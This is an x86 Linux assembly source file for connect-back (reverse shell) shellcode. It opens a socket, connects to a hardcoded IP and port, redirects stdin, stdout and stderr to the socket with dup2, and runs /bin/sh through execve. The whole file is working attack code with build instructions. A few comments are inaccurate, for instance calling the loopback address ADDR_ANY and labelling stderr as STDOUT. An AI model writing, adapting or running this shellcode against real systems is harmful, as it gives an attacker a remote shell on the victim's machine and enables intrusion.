#
# compile:
#           as connect_back.s  && ld a.out  -o connect_back
#
# author:   random 2014-04-22

.text

.set port,0x222

.set ip,0x0100007f

.global _start

_start:

#init
xor  %eax,%eax
xor  %ebx,%ebx
xor  %ecx,%ecx
xor  %edx,%edx


#**** socket(PF_INET, SOCK_STREAM, IPPROTO_IP) ****#
#sys_socketcall(SYS_SOCKET,_user void* data)
push %eax
push $1
push $2
mov  %esp,%ecx      #(_user void* data)  for sockcall
movb $1,%bl         #bl = 1 = SYS_SOCKET
movb $0x66,%al      #socketcall,0x66=102
int  $0x80          
mov  %eax,%esi

#**** server sockaddr(0x10 bytes) ****#
xor %eax,%eax
push  %eax          # 16 bytes unused
push  %eax
push  $ip   # ip = ADDR_ANY = 0         ,4 bytes (net order)
pushw $port         # port
movb  $0x02,%al     # sa_family = 2 = AF_INET   ,2 bytes
pushw %ax
movl  %esp,%ecx

#**** connect(sockfd,&sockaddr,0x10) ****#
push  $0x10         #sizeof(SOCK_ADDR) = 0x16
push  %ecx          #struct sock_addr*
push  %esi          #sockfd
mov   %esp,%ecx     #(_user void* data)  for sockcall
movb  $3, %bl       #bl= 3 = SYS_CONNECT
mov   $0x66,%al     #socketcall
int   $0x80        



#**** dup2(sockfd,0) ****#
mov  %esi,%ebx     #connfd = esi
xor  %ecx,%ecx     #ecx = 0 = STDIN_FILENO
mov  $0x3f,%al     #dup2 0x3f=63
int  $0x80         
#**** dup2(oldfd, newfd=1) ****#
inc  %ecx          #ecx = 1 = STDOUT_FILENO
mov  $0x3f,%al 
int  $0x80 
#**** dup2(oldfd, newfd=2) ****#
inc  %ecx          #ecx = 2 = STDOUT_FILENO
mov  $0x3f,%al     #dup2
int  $0x80 

#**** execve(binfile,[binfile,arg0,arg1,...],NULL) ****#
xor  %edx,%edx
push %edx           #null
push $0x68732f2f    #//sh
push $0x6e69622f    #/bin 
mov  %esp,%ebx 
push %edx 
push %ebx 
mov  %esp ,%ecx
mov  $0xb,%al      #execve
int  $0x80 

#**** exit(0) ****#
inc %eax
int $0x80
